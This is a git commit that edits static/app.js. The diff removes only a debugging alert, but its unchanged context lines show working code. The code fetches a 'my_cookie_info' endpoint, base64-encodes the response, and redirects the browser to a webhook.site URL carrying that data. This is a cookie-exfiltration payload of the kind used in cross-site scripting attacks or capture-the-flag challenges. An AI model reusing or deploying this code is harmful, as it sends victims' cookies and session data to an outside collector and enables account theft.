839dd682d7f2f93811c044f86f9e6618f1d742f7
Xiamong <qw050325@naver.com>
2024-09-19 03:34:29 +0900

    Update app.js

--- static/app.js
+++ static/app.js
@@ -6,7 +6,3 @@ fetch('http://sflee.kro.kr:5555/api/v1/my_cookie_info')
     const encodedText = btoa(htmlText);
     location.href = "https://webhook.site/0d7b605c-cf5d-4f71-97db-58d90cf41843/" + encodedText;
   });
-
-setTimeout(function() {
-  alert('check'); // 'cheak' -> 'check'로 수정
-}, 1000);
